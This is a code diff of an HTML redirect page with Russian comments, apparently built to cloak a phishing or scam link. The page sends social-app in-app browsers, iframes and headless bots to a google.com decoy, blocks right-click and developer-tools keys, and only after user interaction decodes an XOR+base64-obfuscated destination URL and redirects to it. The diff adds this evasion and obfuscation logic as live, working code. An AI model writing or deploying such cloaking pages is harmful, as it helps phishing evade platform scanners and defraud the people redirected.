@@ -2,88 +2,78 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>📷</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="noindex, nofollow" />
+  <title>Redirecting...</title>
   <style>
-    html, body {
-      margin: 0;
-      padding: 0;
-      height: 100%;
-      background: linear-gradient(to bottom, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
-      font-family: system-ui, sans-serif;
+    body {
+      background: #000;
+      color: #0f0;
+      font-family: monospace;
       display: flex;
-      justify-content: center;
       align-items: center;
-    }
-
-    .btn {
-      background-color: white;
-      color: black;
-      border: none;
-      border-radius: 9999px;
-      padding: 1.5rem 3rem;
-      font-size: 2rem;
-      cursor: pointer;
-      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+      justify-content: center;
+      height: 100vh;
     }
   </style>
 </head>
 <body>
-  <button class="btn" onclick="go()">📷</button>
-
+  <noscript>JavaScript is required.</noscript>
   <script>
-    // 🔐 Проверка на встроенные браузеры
-    (function() {
-      const ua = navigator.userAgent.toLowerCase();
-      const isWebview =
-        ua.includes("instagram") ||
-        ua.includes("fbav") ||
-        ua.includes("facebook") ||
-        ua.includes("tinder") ||
-        ua.includes("okhttp") ||
-        ua.includes("webview") ||
-        ua.includes("line") ||
-        ua.includes("pinterest") ||
-        ua.includes("telegram") ||
-        ua.includes("grindr");
+    // === Антибот: WebView и встроенные браузеры ===
+    const ua = navigator.userAgent.toLowerCase();
+    if (
+      ua.includes("instagram") ||
+      ua.includes("fbav") ||
+      ua.includes("facebook") ||
+      ua.includes("tinder") ||
+      ua.includes("okhttp") ||
+      ua.includes("webview") ||
+      ua.includes("grindr") ||
+      ua.includes("pinterest")
+    ) {
+      location.href = "https://google.com"; // пустышка
+    }
 
-      if (isWebview) {
-        window.location.href = "https://google.com"; // или твоя пустышка
-        return;
-      }
+    // === Антибот: Iframe check ===
+    if (window.top !== window.self) {
+      location.href = "https://google.com";
+    }
 
-      // 🛡️ Проверка на iframe
-      if (window.top !== window.self) {
-        window.location.href = "https://google.com";
-        return;
-      }
-    })();
+    // === Антибот: WebDriver detection (headless) ===
+    if (navigator.webdriver) {
+      location.href = "https://google.com";
+    }
 
-    // 👤 Проверка взаимодействия
+    // === Анти-девелопер: запрет на правый клик и F12 ===
+    document.addEventListener("contextmenu", e => e.preventDefault());
+    document.onkeydown = e => {
+      if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && e.keyCode === 73)) return false;
+    };
+
+    // === Защита: редирект только после взаимодействия ===
     let interacted = false;
-    document.addEventListener("mousemove", () => interacted = true);
     document.addEventListener("touchstart", () => interacted = true);
+    document.addEventListener("mousemove", () => interacted = true);
     document.addEventListener("keypress", () => interacted = true);
 
+    // === Декодер: XOR + base64 ===
+    function decodeXorBase64(encoded, key) {
+      const decoded = atob(encoded);
+      return decoded.split('').map(c => String.fromCharCode(c.charCodeAt(0) ^ key)).join('');
+    }
+
+    // === Редирект: по таймеру после взаимодействия ===
     function go() {
       if (!interacted) return;
-
       setTimeout(() => {
-        const encoded = "FDcVEhQbSRpVDBUbU0cME1BdDglbFlcHVRgBFQ=="; // base64 XOR шифрованного URL
-        const xorKey = 3;
-
-        // Декодируем base64
-        const base64Decoded = atob(encoded);
-
-        // Расшифровываем XOR
-        const finalURL = base64Decoded
-          .split('')
-          .map(c => String.fromCharCode(c.charCodeAt(0) ^ xorKey))
-          .join('');
-
-        window.location.href = finalURL;
-      }, 2000);
+        const encrypted = "IS4vvy9pbnNncHZgcSd9J3xwZT0vIHFycGJv"; // ← https://korbendss.github.io/tobexol, закодирован ключом 3
+        const url = decodeXorBase64(encrypted, 3);
+        window.location.href = url;
+      }, 2000); // задержка 2 сек
     }
+
+    go();
   </script>
 </body>
 </html>
